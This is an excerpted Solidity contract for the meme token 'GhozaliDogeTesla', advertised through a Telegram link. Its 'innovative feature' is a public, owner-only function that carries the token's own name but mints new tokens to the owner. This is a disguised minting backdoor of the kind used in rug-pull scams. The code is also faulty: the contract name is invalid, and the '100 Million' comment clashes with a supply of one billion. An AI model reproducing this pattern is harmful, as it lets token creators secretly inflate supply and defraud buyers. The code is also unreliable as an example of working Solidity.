...
//
// $GhozaliDogeTesla proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/Ghozalidogetesla
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Ghozalidogetesla(uint256 amount) public onlyOwner {
 _Ghozalidogetesla(msg.sender, amount);
    }
    ...
    function _Ghozalidogetesla(address account, uint256 amount) internal virtual {
...
contract $GhozaliDogeTesla is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Ghozali Doge Tesla", "Ghozali Doge Tesla") {
        _Ghozalidogetesla(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}